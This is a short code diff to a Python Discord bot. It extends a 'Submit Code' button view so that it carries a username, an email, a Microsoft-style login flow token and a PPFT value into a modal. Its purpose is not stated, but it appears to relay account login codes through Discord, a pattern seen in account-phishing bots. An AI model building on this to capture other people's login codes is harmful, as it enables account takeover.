@@ -4,11 +4,12 @@ import discord
 from ui.modals.modal_two import MyModalTwo
 
 class ButtonViewTwo(ui.View):
-    def __init__(self, username: str, email: str, flowtoken: str):
+    def __init__(self, username: str, email: str, flowtoken: dict, ppft: str = None):
         super().__init__(timeout=None)
         self.username = username
         self.email = email
         self.flowtoken = flowtoken
+        self.ppft = ppft
 
     @discord.ui.button(label="Submit Code", style=discord.ButtonStyle.green, custom_id="persistent:button_two")
     async def button_two(self, button: discord.ui.Button, interaction: discord.Interaction):
@@ -16,6 +17,7 @@ class ButtonViewTwo(ui.View):
             MyModalTwo(
                 str(self.username),
                 self.email,
-                self.flowtoken
+                self.flowtoken,
+                self.ppft
             )
         )
